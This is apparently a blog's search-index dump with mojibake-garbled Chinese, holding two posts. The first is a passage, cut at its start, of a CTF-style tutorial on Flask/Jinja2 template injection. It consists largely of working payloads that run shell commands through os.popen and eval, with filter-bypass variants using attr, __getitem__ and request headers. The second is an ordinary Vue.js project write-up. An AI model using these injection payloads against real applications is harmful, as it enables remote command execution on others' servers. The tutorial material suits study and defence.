æ³•å¾—åˆ°å›æ˜¾ï¼Œè¯¥æ–¹æ³•åªä¸è¿‡æ˜¯æˆåŠŸçš„æ—¶å€™è¿”å›1ï¼Œå¤±è´¥äº†åˆ™æ˜¯è¿”å›0 æ‰§è¡Œå¦‚ä¸‹ï¼š 12http://localhost/?id=&#123;&#123;%20config.__class__.__init__.__globals__[&#x27;os&#x27;].system(&#x27;dir()&#x27;)&#125;&#125; å¾—åˆ°1æˆ–è€…0å¯¹äºæˆ‘ä»¬æ¥è¯´æ„ä¹‰ä¸å¤§ï¼Œå½“ç„¶è¿™æ ·ä¹Ÿå¯ä»¥è¿›è¡Œç›²æ³¨ã€ï¼Œè€Œpopenåˆ™å¯ä»¥è¿”å›æ–‡ä»¶å¯¹è±¡ os.popen è¯¥æ–¹æ³•ä¸ä½†æ‰§è¡Œå‘½ä»¤è¿˜è¿”å›æ‰§è¡Œåçš„ä¿¡æ¯å¯¹è±¡ï¼Œæ˜¯é€šè¿‡ä¸€ä¸ªç®¡é“æ–‡ä»¶å°†ç»“æœè¿”å›ã€‚ output = os.popen(â€˜cat /proc/cpuinfoâ€™) print output.read() äºæ˜¯æˆ‘ä»¬æ„é€ æœ€ç»ˆçš„payloadï¼š 1&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;dir()&#x27;).read()&#125;&#125; 1.2 configä»¥å¤–çš„æ€è·¯å…¶ä»–çš„ä¸€äº›æ€è·¯ï¼Œé¦–å…ˆï¼Œæˆ‘ä»¬çš„configè¢«è¿‡æ»¤äº†ï¼Œæˆ‘ä»¬è¯¥æ€ä¹ˆåŠå‘¢ï¼Ÿé™¤æ­¤ä¹‹å¤–ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡()å’Œâ€™â€™åˆ†åˆ«è·å–åˆ°tupleå’Œstrçš„åˆå§‹åŒ–~ 12&#x27;&#x27;.__class__.__name__ #å¾—åˆ°str()_.__class__.__name__ #tuple è¿™æ—¶å¼•å…¥baseå’Œmroçš„é­”æœ¯æ–¹æ³• 123__bases__ : ç±»çš„åŸºç±»çš„å…ƒç»„ï¼Œé¡ºåºä¸ºå®ƒä»¬åœ¨åŸºç±»åˆ—è¡¨ä¸­å‡ºç°çš„é¡ºåºï¼ˆåŸºç±»å°±æ˜¯Objectç±»~ï¼‰__mro__ :ç±»çš„çˆ¶ç±»ï¼Œä»çˆ¶ç±»ç½‘ä¸Šæ‰¾ï¼Œæœ€ç»ˆä¼šæ‰¾åˆ°åŸºç±»ï¼Œæ‰€ä»¥mro[-1]ç­‰ä»·äº__bases__ è¿™æ—¶å€™æˆ‘ä»¬å°±æƒ³åˆ°çš„ï¼Œæˆ‘ä»¬æ—¢ç„¶å¾—åˆ°äº†åŸºç±»ï¼Œæ˜¯ä¸æ˜¯å°±æƒ³è¦æ‰€æœ‰çš„å­ç±»äº†å‘¢ï¼Ÿæ¯•ç«Ÿå­ç±»çš„å†…å®¹æˆ‘ä»¬æ›´åŠ æ„Ÿå…´è¶£ï¼Œæˆ‘ä»¬æœ€ç»ˆçš„ç›®æ ‡å°±æ˜¯æ‰¾åˆ°osåº“å¯¹å§ã€‚è€Œpythonæ­£å¥½æ‹¥æœ‰è¿™ä¸ªé­”æœ¯æ–¹æ³• 1__subclasses__ #è·å–æ‰€æœ‰çš„å­ç±»æ–¹æ³• ä¹‹åæ…¢æ…¢å»å¯»æ‰¾å³å¯ï¼Œè¯¥æ–‡ç« ä¸­æœ‰ï¼Œåœ¨catch_warnningsæ¨¡å—ä¸‹å«æœ‰__builtins__ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨è¿™ä¸ªå»æ‰¾evalï¼š 12&#123;&#123; [].__class__.__mro__[-1].__subclasses__()[192].__init__.__globals__. __builtins__[&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;dir()&#39;).read()&quot;) &#125;&#125; 1.3æ€»ç»“åšé¢˜çš„æ€è·¯ï¼šæ€»è€Œè¨€ä¹‹ï¼Œæˆ‘ä»¬è¦ä¹ˆå»æ‰¾builtinså‡½æ•°ä¸‹çš„evalï¼Œè¦ä¹ˆå»æ‰¾osã€‚ 2.è°ˆè°ˆè¿‡æ»¤åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œä¼šé‡è§å„ç§å„æ ·çš„è¿‡æ»¤ï¼Œæ¯”å¦‚æˆ‘ä»¬é‡è§å¯¹configçš„è¿‡æ»¤ï¼Œä»¥åŠosè¿‡æ»¤å•Šç­‰ç­‰ 2.1 è¿‡æ»¤äº†osï¼Œsystemç­‰çš„æƒ…å†µåœ¨è¿™ç§æƒ…å†µä¸‹æˆ‘ä»¬ä¹Ÿä¸éœ€æ…Œï¼Œå¦‚æœåªæ˜¯å¯¹ä¸­æ‹¬å·ä¸­å¯èƒ½ç”¨åˆ°çš„å†…å®¹è¿›è¡Œè¿‡æ»¤çš„è¯ï¼Œæˆ‘ä»¬å®Œå…¨å¯ä»¥é€šè¿‡æ‹¼æ¥ç»•è¿‡ï¼š æ¯”å¦‚æˆ‘ä»¬ä¹‹å‰çš„payloadä¿®æ”¹æˆï¼š 1?id=&#123;&#123; config.__init__.__globals__[&#x27;o&#x27;+&#x27;s&#x27;].popen(&#x27;dir&#x27;).read() &#125;&#125; 2.2 è¿‡æ»¤äº†ä¸­æ‹¬å·è¿™æ ·çš„è¯,å¯ä»¥ç”¨getitemæ–¹æ³•ï¼Œè¯¥æ–¹æ³•ç­‰ä»·äºä¸€ä¸ªè¿­ä»£å™¨çš„é€‰æ‹©ï¼Œå¼€å‘è€…çš„åŸæ„æ˜¯è®©äººä»¬å¯ä»¥ç”¨è¿™ä¸ªè¿­ä»£å¯¹è±¡,è¿™ç¯‡æ–‡ç« è®²çš„ä¸é”™ 1https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_24805141&#x2F;article&#x2F;details&#x2F;81411775 Pythonçš„é­”æ³•æ–¹æ³•__getitem__ å¯ä»¥è®©å¯¹è±¡å®ç°è¿­ä»£åŠŸèƒ½ï¼Œè¿™æ ·å°±å¯ä»¥ä½¿ç”¨for...in... æ¥è¿­ä»£è¯¥å¯¹è±¡äº†ï¼ŒåŒæ—¶ä¹Ÿå…è®¸æˆ‘ä»¬åˆ©ç”¨gettiemæ¥ç›´æ¥é€‰æ‹©å†…å®¹,æ‰€ä»¥æˆ‘ä»¬ä¹‹å‰çš„payloadï¼š 1&#123;&#123; config.__init__.__globals__.__getitem__(&#x27;os&#x27;).popen(&#x27;dir()&#x27;).read() &#125;&#125; åˆ©ç”¨requestèµ·æ­¥ 1&#123;&#123; request.__class__.__mro__.__getitem__(-1).__subclasses__().__getitem__(192).__init__.__globals__.__builtins__.__getitem__(&#x27;eval&#x27;)(&quot;__import__(&#x27;os&#x27;).popen(&#x27;dir()&#x27;).read()&quot;) &#125;&#125; 2.3 è¿‡æ»¤äº†.å·è¿™ä¸ªå¯ä»¥ä½¿ç”¨attræ¥è¿›è¡Œç»•è¿‡äº†ï¼Œç›´æ¥ç»™å‡ºç»•è¿‡æ–¹æ³•ï¼š æ‰€ä»¥ä¹‹å‰çš„payloadè¿›è¡Œå¯¹æ¯”ï¼š 12345[].__class__ = []|attr(__class__)&#123;&#123;[]|attr(&#x27;__class__&#x27;)|attr(&#x27;__base__&#x27;)|attr(&#x27;__subclasses__&#x27;)() &#125;&#125;&#123;&#123; ([]|attr(&#x27;__class__&#x27;)|attr(&#x27;__base__&#x27;)|attr(&#x27;__subclasses__&#x27;)())[190] &#125;&#125; 12&#123;&#123; ([]|attr(&#x27;__class__&#x27;)|attr(&#x27;__base__&#x27;)|attr(&#x27;__subclasses__&#x27;)())[192]|attr(&#x27;__init__&#x27;)|attr(&#x27;__globals__&#x27;)|attr(&#x27;__builtins__&#x27;)|attr(__getitem__)(&#x27;eval&#x27;) &#125;&#125; # æ‹¼åˆ°è¿™é‡Œæ‹¼ä¸ä¸‹å»äº†ã€‚ã€‚è¯·é—®æœ‰äººçŸ¥é“ä¸ºä»€ä¹ˆå˜›,evalæ— è®ºå¦‚ä½•éƒ½å–ä¸åˆ°äº† ä¸çŸ¥é“ä¸ºä»€ä¹ˆåœ¨æˆ‘ä»ä¸Šå¾€ä¸‹ç»§ç»­å–å€¼çš„æ—¶å€™ï¼Œæ€ä¹ˆéƒ½æ²¡æ³•ç»§ç»­å‘ä¸‹å–å€¼äº†ã€‚ä½†æ˜¯çœ‹è§å¯ä»¥è½¬æ¢æ€è·¯ 2.5åˆ©ç”¨requestâ€‹ å› ä¸ºflaskæ­¤æ—¶èƒ½å…è®¸ç”¨æˆ·è‡ªå®šä¹‰è¾“å‡ºï¼Œåæœ‰å…«ä¹æ˜¯æœ‰requestçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å»åˆ©ç”¨è¿™ä¸ªä¹Ÿä¸æ˜¯ç›¸å½“ä¸é”™çš„ è¿™é‡Œç¿»é˜…åˆ°äº†ä¸€ä¸ªè€å¤–æ€è·¯ï¼Œä½†æ˜¯ä»–æ²¡ç»™å…¨ã€‚ 1http://localhost/?id=&#123;&#123;request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)|attr(&#x27;__base__&#x27;) &#125;&#125;&amp;class=class&amp;usc=_&amp;init=init åˆ©ç”¨requestçš„æ€è·¯å»é‡æ–°æŠŠpayloadæ‹¼å‡ºæ¥ 1?id=&#123;&#123;[][request[&#x27;args&#x27;][&#x27;class&#x27;]][request[&#x27;args&#x27;][&#x27;base&#x27;]][request[&#x27;args&#x27;][&#x27;subclasses&#x27;]]()[153][request[&#x27;args&#x27;][&#x27;dict&#x27;]][request[&#x27;args&#x27;][&#x27;init&#x27;]][request[&#x27;args&#x27;][&#x27;globals&#x27;]][request[&#x27;args&#x27;][&#x27;builtins&#x27;]][&#x27;eval&#x27;](request[&#x27;args&#x27;][&#x27;payload&#x27;])&#125;&#125;&amp;base=__base__&amp;subclasses=__subclasses__&amp;dict=__dict__&amp;init=__init__&amp;globals=__globals__&amp;builtins=__builtins__&amp;class=__class__&amp;payload=__import__(&#x27;os&#x27;).popen(&#x27;dir()&#x27;).read() 2.4å°†ä¸­æ‹¬å·å’Œ.å·éƒ½è¿‡æ»¤æƒ…å†µä¸‹å½“ç„¶ä¸Šé¢çš„éš¾åº¦éƒ½æ˜¯ç›¸å½“ç®€å•çš„é¢˜ç›®æ‰ä¼šé‡è§äº†ï¼Œåœ¨å½“å‰ç¯å¢ƒä¸‹ï¼Œå¾€å¾€ä¼šè¿‡æ»¤çš„ç›¸å½“ä¸¥æ ¼ï¼Œæˆ‘ä»¬åº”è¯¥ä»flaskæœ¬èº«å‡ºç°çš„ç±»å¼€å§‹æ‰¾ï¼Œæ¯”å¦‚é¢˜ç›®å¯èƒ½éªŒè¯çš„æ—¶å€™ï¼Œä»…ä»…éªŒè¯æˆ‘ä»¬è¾“å…¥çš„idã€‚ä½†æ˜¯æˆ‘ä»¬å¯ä»¥åˆ©ç”¨æ­¤ï¼Œè®©flaskè¯»å–headerä¸­çš„å†…å®¹ï¼Œè¿™æ ·å°±å¯ä»¥æ‰“ç ´é™åˆ¶ æˆ‘ä»¬å¯ä»¥å…ˆå†™ä¸€ä¸ªè„šæœ¬ï¼š 123456789101112http://localhost/?id=&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__ == &#x27;catch_warnings&#x27; %&#125; &#123;% for b in c.__init__.__globals__.values() %&#125; &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125; &#123;% if &#x27;eval&#x27; in b.keys() %&#125; &#123;&#123; b[&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;dir()&quot;).read()&#x27;) &#125;&#125; &#123;% endif %&#125; &#123;% endif %&#125; &#123;% endfor %&#125;&#123;% endif %&#125;&#123;% endfor %&#125; ä¹‹åä¸ºäº†ç»•è¿‡æ‹¬å·çš„é™åˆ¶ï¼Œé‡‡ç”¨è¿™ç§æ–¹æ³•ï¼š è¿™é‡Œç»™å‡ºä¸€ä¸ªpayloadï¼š 12345678910111213141516171819&#123;% for c in []|attr(request.headers.x1)|attr(request.headers.x2)|attr(request.headers.x3)() %&#125; &#123;% if c|attr(request.headers.x4)==request.headers.x5 %&#125; &#123;%for d in ((c|attr(request.headers.x6)|attr(request.headers.x7))[request.headers.x8])%&#125; &#123;%if d==request.headers.x9%&#125;&#123;&#123;((c|attr(request.headers.x6)|attr(request.headers.x7))[request.headers.x8])[d](request.headers.x13)&#125;&#125; &#123;% endif %&#125; &#123;% endfor %&#125; &#123;% endif%&#125;&#123;% endfor %&#125; x13: __import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()x9: evalx8: __builtins__x7: __globals__x6: __init__x5: catch_warningsx4: __name__x3: __subclasses__x2: __base__x1: __class__","categories":[],"tags":[]},{"title":"Vueæ€»ç»“","slug":"Vueæ€»ç»“","date":"2020-10-25T13:28:49.000Z","updated":"2020-10-25T13:43:57.379Z","comments":true,"path":"2020/10/25/Vueæ€»ç»“/","link":"","permalink":"http://example.com/2020/10/25/Vue%E6%80%BB%E7%BB%93/","excerpt":"Vue partæ€»ç»“äº†å‰ç«¯é¡¹ç›®çš„æ­å»ºï¼Œä»¥åŠè‡ªå·±åœ¨è¿™æ¬¡ä½œå“ä¸­å­¦åˆ°äº†ä»€ä¹ˆ","text":"Vue partæ€»ç»“äº†å‰ç«¯é¡¹ç›®çš„æ­å»ºï¼Œä»¥åŠè‡ªå·±åœ¨è¿™æ¬¡ä½œå“ä¸­å­¦åˆ°äº†ä»€ä¹ˆ Vueæˆ‘è®¤ä¸ºå­¦ä¸‹æ¥å°±æ˜¯å¾ˆçˆ½ï¼ŒåŸºæœ¬ä¸Šä¸ç”¨å†å„ç§å»ç»‘å®šJSå½“ä¸­çš„domå…ƒç´ äº†ï¼ˆgetElementByIdä»€ä¹ˆçš„ï¼‰ å…¶ä¸­åŸºç¡€æºç ï¼Œæœ‰ä¸€ä¸ªindex.html 1.index.html123456789101112131415161718&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width,initial-scale=1.0&quot;&gt; &lt;link rel=&quot;icon&quot; href=&quot;&lt;%= BASE_URL %&gt;favicon.ico&quot;&gt; &lt;title&gt;&lt;%= htmlWebpackPlugin.options.title %&gt;&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;noscript&gt; &lt;strong&gt;We&#x27;re sorry but &lt;%= htmlWebpackPlugin.options.title %&gt; doesn&#x27;t work properly without JavaScript enabled. Please enable it to continue.&lt;/strong&gt; &lt;/noscript&gt; &lt;div id=&quot;app&quot;&gt;&lt;/div&gt; &lt;!-- built files will be auto injected --&gt; &lt;/body&gt;&lt;/html&gt; å¯åŠ¨çš„æ—¶å€™æœ‰ä¸€ä¸ªmain.jsï¼ŒAPP.vueç­‰ç­‰ã€‚ç°åœ¨è®²ä¸€ä¸‹æˆ‘æ˜¯æ€ä¹ˆåšä¸‹æ¥çš„ï¼Œæˆ‘åˆ©ç”¨åˆ°çš„æ¡†æ¶æ˜¯antdvï¼Œå†package.jsonå½“ä¸­å¯ä»¥æ‰¾åˆ° 2.package.json1234567891011121314151617181920212223242526272829303132&quot;dependencies&quot;: &#123; &quot;@antv/data-set&quot;: &quot;^0.11.7&quot;, &quot;@antv/g2&quot;: &quot;^4.0.15&quot;, &quot;@sven0706/websocket&quot;: &quot;^1.0.1&quot;, &quot;ant-design-vue&quot;: &quot;^1.6.5&quot;, &quot;axios&quot;: &quot;^0.20.0&quot;, &quot;core-js&quot;: &quot;^3.6.5&quot;, &quot;echarts&quot;: &quot;^4.9.0&quot;, &quot;html2canvas&quot;: &quot;^1.0.0-rc.7&quot;, &quot;js-cookie&quot;: &quot;^2.2.1&quot;, &quot;jspdf&quot;: &quot;^2.1.1&quot;, &quot;less&quot;: &quot;^3.12.2&quot;, &quot;less-loader&quot;: &quot;^7.0.1&quot;, &quot;rc-resize-observer&quot;: &quot;^0.2.5&quot;, &quot;react&quot;: &quot;^16.13.1&quot;, &quot;react-dom&quot;: &quot;^16.13.1&quot;, &quot;react-window&quot;: &quot;^1.8.5&quot;, &quot;vant&quot;: &quot;^2.10.9&quot;, &quot;vue&quot;: &quot;^2.6.11&quot;, &quot;vue-print-nb&quot;: &quot;^1.5.0&quot;, &quot;vue-router&quot;: &quot;^3.4.5&quot;, &quot;vuex&quot;: &quot;^3.5.1&quot; &#125;, &quot;devDependencies&quot;: &#123; &quot;@vue/cli-plugin-babel&quot;: &quot;~4.5.0&quot;, &quot;@vue/cli-plugin-eslint&quot;: &quot;~4.5.0&quot;, &quot;@vue/cli-service&quot;: &quot;~4.5.0&quot;, &quot;babel-eslint&quot;: &quot;^10.1.0&quot;, &quot;eslint&quot;: &quot;^6.7.2&quot;, &quot;eslint-plugin-vue&quot;: &quot;^6.2.2&quot;, &quot;vue-template-compiler&quot;: &quot;^2.6.11&quot; &#125;, è¦ç”¨çš„æ—¶å€™å†é¡¹ç›®æ ¹ç›®å½•ä¸‹cnpm -iå³å¯ã€‚ è®²ä¸€ä¸‹è·¯ç”±è¯¥æ€ä¹ˆåšæŠŠï¼Œé¦–å…ˆåˆ›å»ºä¸€ä¸ª 3.router.js1234//å¼•å…¥vueimport Vue from &#x27;vue&#x27;;//å¼•å…¥vue-routerimport VueRouter from &#x27;vue-router&#x27;; åœ¨Vueå½“ä¸­ï¼Œæ‰€æœ‰éœ€è¦å¼•ç”¨çš„ä¸œè¥¿éœ€è¦ç”¨Vue.useä¹‹åæ‰ä¼šç”Ÿæ•ˆ æ•…æˆ‘ä»¬æ„é€ ä¹‹åçš„ä»£ç æ¡†æ¶å¤§è‡´å¦‚ä¸‹ï¼š 1234567891011121314151617//å¼•å…¥vueimport Vue from &#x27;vue&#x27;;//å¼•å…¥vue-routerimport VueRouter from &#x27;vue-router&#x27;;Vue.use(VueRouter)//å¼•ç”¨page1é¡µé¢import upload from &#x27;./components/upload.vue&#x27;;import login from &#x27;./components/login.vue&#x27;;//å®šä¹‰routesè·¯ç”±çš„é›†åˆï¼Œæ•°ç»„ç±»å‹const routes=[ //å•ä¸ªè·¯ç”±å‡ä¸ºå¯¹è±¡ç±»å‹ï¼Œpathä»£è¡¨çš„æ˜¯è·¯å¾„ï¼Œcomponentä»£è¡¨ç»„ä»¶ &#123;path:&#x27;/upload&#x27;,component:upload&#125;, &#123;path:&#x27;/login&#x27;,component:login&#125;, ä¸€ä¸ªVueæ–‡ä»¶çš„æ ¼å¼å¦‚ä¸‹ï¼š 4.ä¸»å…¥å£123456789101112131415161718&lt;template&gt; &lt;div id&#x3D;&quot;app&quot;&gt; &lt;router-view&#x2F;&gt; &lt;&#x2F;div&gt;&lt;&#x2F;template&gt;&lt;script&gt;export default &#123; name: &#39;App&#39;, &#125;&lt;&#x2F;script&gt;&lt;style&gt;&lt;&#x2F;style&gt; åœ¨templateå½“ä¸­æ„é€ HTMLçš„ä»£ç ï¼Œscriptå½“ä¸­æ„é€ å½“å‰é¡µé¢çš„JSï¼Œè€Œstyleè®¾ç½®ä¸­å†™cssã€‚å¦‚æœä¸åšé™å®šï¼ŒCSSå°†ä¼šæ˜¯å…¨å±€ç”Ÿæ•ˆçš„ï¼ è€ŒAPPä½œä¸ºä¸»é¡µé¢ï¼Œåªéœ€è¦å†™ä¸€å¥è¯å³å¯ï¼š 1&lt;router-view/&gt; è¿™ä¸€å¥è¯çš„æ„æ€ä»£ç å°†é¡µé¢å†…å®¹æ‰˜ç®¡ç»™Vueï¼Œæ ¹æ®vueçš„Routeræ¥æ˜¾ç¤ºå†…å®¹ è€ŒRouterçš„è®¾ç½®åœ¨main.jså½“ä¸­ï¼ˆå®é™…ä¸Šï¼Œå‡ ä¹æ‰€æœ‰çš„è®¾ç½®éƒ½æ”¾åœ¨main.jså½“ä¸­è¿›è¡Œç»Ÿä¸€è®¾ç½®ï¼‰ 1234new Vue(&#123; router, render: h =&gt; h(App),&#125;).$mount(&#x27;#app&#x27;) åœ¨main.jså¯¼å…¥çš„æ¨¡å—å¯ä»¥å…¨é¡¹ç›®ç”Ÿæ•ˆï¼Œå¦‚æœæƒ³è¦æ™®é€šçš„ç”Ÿæ•ˆä¸€ä¸ªæ¨¡å—ï¼Œè¿™æ ·æ„é€ ï¼š 123456789101112import &#123; Button, Table, Menu, Switch,Icon,Layout,Upload,Breadcrumb,FormModel,Input,Divider,message,Form,Alert,Spin,Modal &#125; from &#x27;ant-design-vue&#x27;//åœ¨ä¸‹é¢ï¼šVue.use(Modal)Vue.use(Spin)Vue.use(Alert)Vue.use(Form)Vue.use(axios)Vue.use(htmlToPdf)Vue.use(Divider)Vue.use(Input)Vue.use(FormModel) å¦‚æœæƒ³è¦ä¿®æ”¹Vueé»˜è®¤çš„è®¾ç½®ï¼Œä¾‹å¦‚æˆ‘ä»¬å¯¼å…¥axiosçš„æ—¶å€™è¿™æ ·æ„é€ ï¼š 12import axios from &#x27;axios&#x27;Vue.prototype.$http = axios ä¹‹åæˆ‘æ„é€ äº†ä¸€ä¸ªå…¬å…±ä½¿ç”¨çš„Vueæ¨¡æ¿ï¼Œä¹Ÿå°±æ˜¯èœå•æ çš„æ’ä»¶ï¼Œæˆ‘æ˜¯åˆ›å»ºäº†ä¸€ä¸ªcommonsæ–‡ä»¶å¤¹ï¼Œå¹¶å†™åœ¨é‡Œé¢ 5.æ’æ§½12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576&lt;template&gt; &lt;a-layout id=&quot;components-layout-demo-side&quot; style=&quot;min-height: 100vh&quot;&gt; &lt;a-layout-sider v-model=&quot;collapsed&quot; width=&quot;12%&quot; collapsible&gt; &lt;div class=&quot;logo&quot; /&gt; &lt;a-menu theme=&quot;dark&quot; :default-selected-keys=&quot;[&#x27;1&#x27;]&quot; mode=&quot;inline&quot;&gt; &lt;a-menu-item key=&quot;1&quot;&gt; &lt;router-link to=&quot;upload&quot;&gt;&lt;a-icon type=&quot;cloud-download&quot; /&gt; &lt;span&gt; æ–‡ä»¶ä¸Šä¼  &lt;/span&gt; &lt;/router-link&gt; &lt;/a-menu-item&gt; &lt;a-sub-menu key=&quot;sub1&quot;&gt; &lt;span slot=&quot;title&quot;&gt;&lt;a-icon type=&quot;area-chart&quot; /&gt; &lt;span&gt; æ•°æ®åˆ†æ &lt;/span&gt; &lt;/span&gt; &lt;a-menu-item key=&quot;2&quot;&gt; &lt;router-link to=&quot;report&quot;&gt; æ—¥å¿—åˆ†æ &lt;/router-link&gt; &lt;/a-menu-item&gt; &lt;a-menu-item key=&quot;3&quot;&gt; &lt;router-link to=&quot;getpdf&quot;&gt; è·å–æŠ¥å‘Š &lt;/router-link&gt; &lt;/a-menu-item&gt; &lt;/a-sub-menu&gt; &lt;a-sub-menu key=&quot;sub2&quot;&gt; &lt;span slot=&quot;title&quot;&gt;&lt;a-icon type=&quot;dashboard&quot; /&gt;&lt;span&gt;ç«‹ä½“æ•°æ®&lt;/span&gt;&lt;/span&gt; &lt;a-menu-item key=&quot;5&quot;&gt; &lt;router-link to=&quot;attackaddress&quot;&gt; æ”»å‡»æº¯æº &lt;/router-link&gt; &lt;/a-menu-item&gt; &lt;a-menu-item key=&quot;8&quot;&gt; &lt;router-link to=&quot;watchlog&quot;&gt; å®æ—¶ç›‘æ§ &lt;/router-link&gt; &lt;/a-menu-item&gt; &lt;/a-sub-menu&gt; &lt;a-menu-item key=&quot;9&quot;&gt; &lt;router-link to=&quot;setting&quot;&gt; &lt;a-icon type=&quot;setting&quot; /&gt; &lt;span&gt;ç³»ç»Ÿè®¾ç½®&lt;/span&gt; &lt;/router-link&gt; &lt;/a-menu-item&gt; &lt;a-menu-item key=&quot;10&quot; @click=&quot;showModal&quot;&gt; &lt;a-icon type=&quot;login&quot; /&gt; &lt;span &gt;ç™»å‡º&lt;/span&gt; &lt;a-modal v-model=&quot;visible&quot; title=&quot;Basic Modal&quot; @ok=&quot;handleOk&quot;&gt; &lt;p&gt;æ˜¯å¦ç¡®å®šç™»å‡ºï¼Ÿ&lt;/p&gt; &lt;/a-modal&gt; &lt;/a-menu-item&gt; &lt;/a-menu&gt; &lt;/a-layout-sider&gt; &lt;a-layout&gt; &lt;a-layout-header theme=dark &gt; &lt;/a-layout-header&gt; &lt;!-- ä¸Šé¢æ˜¯åœ¨å¯¼èˆªæ æœ€é¡¶ç«¯åŠ ä¸œè¥¿ --&gt; &lt;a-layout-content style=&quot;margin: 0 16px&quot;&gt; &lt;slot&gt;&lt;/slot&gt; &lt;/a-layout-content&gt; &lt;a-layout-footer style=&quot;text-align: center&quot;&gt; Ant Design Â©2018 Created by Ant UED &lt;/a-layout-footer&gt; &lt;/a-layout&gt; &lt;/a-layout&gt;&lt;/template&gt;&lt;script&gt; éœ€è¦æ³¨æ„çš„æ˜¯ï¼š 1&lt;slot&gt;&lt;/slot&gt; åœ¨Vueå½“ä¸­ï¼Œè¿™ä¸ªç›¸å½“äºä¸€ä¸ªæ’æ§½ï¼Œä¹Ÿå°±æ˜¯ï¼Œå‘ƒï¼Œç±»ä¼¼ä¸€ä¸ªincludeå‡½æ•°ï¼Œæˆ‘ä»¬å¦‚æœæƒ³è¦æŠŠä»–å½“ä½œæ¨¡æ¿çš„è¯å°±éœ€è¦è¿™æ ·å†™ï¼Œæ¯”å¦‚æˆ‘ä»¬çš„report.vue 1234567import menus from &#x27;../commons/menu&#x27;&lt;menu&gt;&lt;/menu&gt;//åœ¨ä¸‹é¢å¯¼å…¥ï¼Œä¹‹åå†htmlå½“ä¸­ä½¿ç”¨å³å¯components:&#123; menus, &#125;, 6.è·¯ç”±å®ˆå«æˆ‘ä»¬å‰ç«¯è‚¯å®šæ˜¯è¦é‰´æƒçš„å§ï¼Œä¸ç„¶ç”¨æˆ·å°±å¯å¯¹å‰ç«¯ä¸ºæ‰€æ¬²ä¸ºäº†ï¼Œæ•…æˆ‘ä»¬æ„é€ ä¸€ä¸ªå±€éƒ¨å®ˆå«æ˜¯è¿™æ ·çš„ï¼š 123456beforeRouteEnter(to,from,next) &#123; axios.post(&#x27;/report&#x27;).then(res =&gt;&#123; if (res.data == 0) next(&#123; path:&#x27;/&#x27; &#125;); else next(); &#125;) &#125;, è¿™æ ·çš„è¯ï¼Œå†è®¿é—®è¯¥è·¯ç”±ï¼Œç¦»å¼€è·¯ç”±çš„æ—¶å€™éƒ½ä¼šå…ˆè®¿é—®ä¸€æ¬¡é¡µé¢ï¼Œæˆ‘ä»¬åç«¯å†™å¥½ä»£ç ï¼Œå¦‚æœç”¨æˆ·æ²¡æœ‰ç™»é™†çš„è¯ï¼Œå°±ä¼šè¿”å›åˆ°indexé¡µé¢äº†ã€‚ 7.æœŸå¾…å€¼è¿™ä¸ªç†è§£èµ·æ¥å•é å˜´è¯´è¾ƒä¸ºåƒµç¡¬ï¼Œéœ€è¦å®æˆ˜ä¸­ä½¿ç”¨æ‰å¯ä»¥é¢†æ‚Ÿçš„æ¸…æ¥šï¼Œæ¯”å¦‚æˆ‘ä»¬çš„htmlä»£ç ä¸­æ„é€ å¦‚ä¸‹ï¼š 1&lt;a-button type=&quot;danger&quot; :style=&quot;&#123;margin:&#x27;-20px 0px 0px 200px&#x27;&#125;&quot; @click=&quot;ExportSavePdf(htmlTitle,nowTime)&quot;&gt;æŠ¥å‘Šç”Ÿæˆ&lt;/a-button&gt; ï¼ˆé€šè¿‡Vueæ¡†æ¶ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨@clickçš„æ–¹æ³•æ¥å¤„ç†å„ç§äº‹ä»¶ï¼Œä¹‹åå¡«å…¥ä¸€ä¸ªå‡½æ•°ï¼Œå¹¶å†™å…¥å‡½æ•°çš„å®å‚ï¼Œè€Œå®å‚ä¸ä¸€å®šæ˜¯ä¸€å®šå‡ºç°çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬çš„å®å‚å¯èƒ½ä¼šå‡ºç°ä¸ºnullçš„æƒ…å†µï¼Œè€ŒVueä¸æƒ³å‡ºç°è¿™ç§æƒ…å†µï¼Œæ‰€ä»¥è¦æ±‚æˆ‘ä»¬å¡«å…¥é»˜è®¤å€¼ï¼Œä¹Ÿå°±æ˜¯æœŸå¾…å€¼ï¼Œå½“æˆ‘ä»¬æ²¡æœ‰å¡«å…¥å‚æ•°çš„æ—¶å€™è‡ªåŠ¨å¡«å…¥çš„å‚æ•° 12345678data() &#123; return &#123; data, columns, htmlTitle: &#x27;report&#x27;, keyName: &#x27;&#x27;, &#125;; &#125;, 8.è®¾ç½®é»˜è®¤å€¼æœ‰çš„æ—¶å€™ï¼Œæˆ‘ä»¬å¯èƒ½æƒ³åœ¨ç”¨æˆ·è®¿é—®ä¹‹å‰çš„æ—¶å€™ç›´æ¥è·å–æ•°æ®ï¼Œè¿™æ ·çš„è¯å°±å¯ä»¥ç›´æ¥æ‹¿åˆ°æ•°æ®äº†ï¼Œäºæ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡å¦‚ä¸‹æ–¹æ³•ï¼š 123mounted() &#123; // this.drawChart(); &#125; ä»¥è¿™ç§æ–¹å¼å¡«å…¥çš„å€¼ï¼Œå½“ç”¨æˆ·è®¿é—®é¡µé¢çš„æ—¶å€™ä¾¿ä¼šè‡ªåŠ¨è¿›è¡Œè°ƒç”¨ã€‚ä¾‹å­ï¼š 1234567axios.post(&#x27;/setting&#x27;).then(res=&gt;&#123; this.usersData(res.data); // location.reload() &#125;).catch(err=&gt;&#123; // console.log(err) &#125;) 